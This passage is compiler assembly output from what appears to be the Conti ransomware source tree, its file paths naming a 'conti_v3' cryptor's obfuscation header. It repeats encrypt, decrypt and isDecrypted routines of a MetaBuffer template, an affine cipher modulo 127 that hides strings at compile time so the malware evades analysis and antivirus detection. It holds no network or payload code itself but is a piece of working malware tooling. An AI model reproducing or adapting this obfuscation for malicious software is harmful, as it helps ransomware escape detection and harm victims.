; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EP@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<79,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FD@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0FD@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<83,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 33 00 00 00	 mov	 ecx, 51			; 00000033H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 1a	 imul	 r8d, ecx, 26

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FD@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<83,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0FD@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0FD@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<83,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 53	 imul	 r8d, eax, 83		; 00000053H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 33	 add	 r8d, 51			; 00000033H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0FD@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<83,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0FD@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0FD@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<83,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0FD@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<83,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 54	 sub	 eax, 84			; 00000054H
  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 35	 imul	 r8d, eax, 53		; 00000035H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 54	 add	 r8d, 84			; 00000054H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<53,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<53,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 67	 sub	 eax, 103		; 00000067H
  00006	44 6b c0 0f	 imul	 r8d, eax, 15

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 11	 imul	 r8d, eax, 17
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 67	 add	 r8d, 103		; 00000067H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<17,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<17,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EH@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EH@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<71,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 42	 sub	 eax, 66			; 00000042H
  00006	44 6b c0 22	 imul	 r8d, eax, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EH@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<71,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EH@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EH@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<71,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 47	 imul	 r8d, eax, 71		; 00000047H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 42	 add	 r8d, 66			; 00000042H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EH@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<71,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EH@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EH@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<71,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EH@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<71,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$01$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 39 00 00 00	 mov	 ecx, 57			; 00000039H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3f	 imul	 r8d, ecx, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$01$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$01$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 04 45 39
	00 00 00	 lea	 r8d, DWORD PTR [rax*2+57]
  0000b	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$01$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$01$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$01$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<2,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$01$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<2,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$06$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 22 00 00 00	 mov	 ecx, 34			; 00000022H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00016	41 f7 e8	 imul	 r8d
  00019	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001e	41 03 d0	 add	 edx, r8d
  00021	c1 fa 06	 sar	 edx, 6
  00024	8b ca		 mov	 ecx, edx
  00026	c1 e9 1f	 shr	 ecx, 31
  00029	03 d1		 add	 edx, ecx
  0002b	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002e	44 2b c1	 sub	 r8d, ecx
  00031	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00035	41 f7 e8	 imul	 r8d
  00038	41 03 d0	 add	 edx, r8d
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b ca		 mov	 ecx, edx
  00040	c1 e9 1f	 shr	 ecx, 31
  00043	03 d1		 add	 edx, ecx
  00045	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00048	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004b	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004f	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$06$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
